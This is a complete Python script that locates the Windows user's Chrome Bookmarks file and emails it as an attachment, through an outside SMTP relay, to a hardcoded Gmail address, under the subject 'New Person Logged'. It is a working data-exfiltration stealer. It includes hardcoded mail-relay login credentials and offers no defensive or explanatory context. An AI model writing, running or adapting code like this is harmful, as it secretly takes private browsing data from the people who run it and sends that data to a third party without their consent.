import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def send_email(filename, attachment):
    # Email configurations
    sender_email = "x32ware@gmail.com"
    receiver_email = "x32ware@gmail.com"
    subject = "New Person Logged - Bookmarks File Attached"
    body = "Attached is the newly logged user's bookmarks file."

    # Setup MIME
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message.attach(MIMEBase("application", "octet-stream"))

    # Add attachment
    with open(attachment, "rb") as attachment_file:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment_file.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {os.path.basename(attachment)}",
        )
        message.attach(part)

    # Connect to SMTP server and send email
    smtp_server = "smtp-relay.brevo.com"
    smtp_port = 587
    smtp_username = "x32ware@gmail.com"
    smtp_password = "1q4vPXpTamMbNHWY"

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(sender_email, receiver_email, message.as_string())

    print("Email sent successfully!")

def main():
    try:
        # Get the current user's name
        username = os.getlogin()
        
        # Construct the path to the user's directory
        user_directory = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
        bookmarks_file_path = os.path.join(user_directory, 'Bookmarks')
        
        # Check if Bookmarks file exists in the user's directory
        if os.path.exists(bookmarks_file_path):
            # Send the file as an email attachment
            send_email("Bookmarks", bookmarks_file_path)
        else:
            print(f"The Bookmarks file does not exist at {bookmarks_file_path}.")
    
    except PermissionError:
        print("Permission denied. Please check your access rights.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
